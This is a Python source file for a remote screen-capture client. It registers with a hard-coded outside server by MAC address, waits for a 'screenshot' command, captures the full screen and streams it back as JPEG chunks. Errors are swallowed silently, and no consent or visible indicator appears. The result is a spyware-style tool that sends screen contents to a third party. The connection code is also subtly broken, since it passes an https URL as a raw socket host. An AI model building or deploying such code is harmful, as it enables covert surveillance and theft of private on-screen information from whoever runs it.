from socket import socket, AF_INET, SOCK_STREAM
from PIL.ImageGrab import grab
from io import BytesIO
from json import dumps, loads

from uuid import getnode

class Client_B:
    def __init__(self, server = 'localhost', port = 1234):
        self.mac_addr = ':'.join(['{:02x}'.format((getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        self.server = server
        self.port = port

        self.server_socket = socket(AF_INET, SOCK_STREAM)
        self.server_socket.connect((self.server, self.port))
        send_data = {
            "role": "client",
            "mac": self.mac_addr
        }

        self.server_socket.send(dumps(send_data).encode())
        response = self.server_socket.recv(1024)
        data = loads(response.decode())

        if not data["success"]:
            self.server_socket.close()
            raise Exception

    def split_data(self, byte_data, chunk_size):
        chunks = []
        max = abs(len(byte_data)-1) // chunk_size
        for i in range(0, len(byte_data), chunk_size):
            chunk = self.mac_addr.encode()
            chunk += str(i//chunk_size).zfill(10).encode()
            chunk += str(max).zfill(10).encode()
            chunk += byte_data[i:i+chunk_size]
            chunks.append(chunk)
        return chunks

    def send_data(self, byte_data):
        data_chunks = self.split_data(byte_data, 1024)
        for chunk in data_chunks:
            try:
                self.server_socket.send(chunk)
                response = self.server_socket.recv(1024)
            except:
                print("client socket closed unexpectedly")
                break
            try:
                data = loads(response.decode())
                if data['command'] == "received":
                    continue
            except:
                print("received data format error")
                break

    def receive_data(self):
        response = self.server_socket.recv(1024)
        return loads(response.decode())
    
try:
    client_b = Client_B('https://socket-server-client.onrender.com/')
    while True:
        try:
            data = client_b.receive_data()
        except ConnectionResetError:
            break
        if data['command'] == "screenshot":
            img = grab(bbox=None)
            jpg = img.convert('RGB')
            with BytesIO() as f:
                jpg.save(f, format='JPEG')
                jpg_bytes = f.getvalue()
            client_b.send_data(jpg_bytes)
except:
    pass
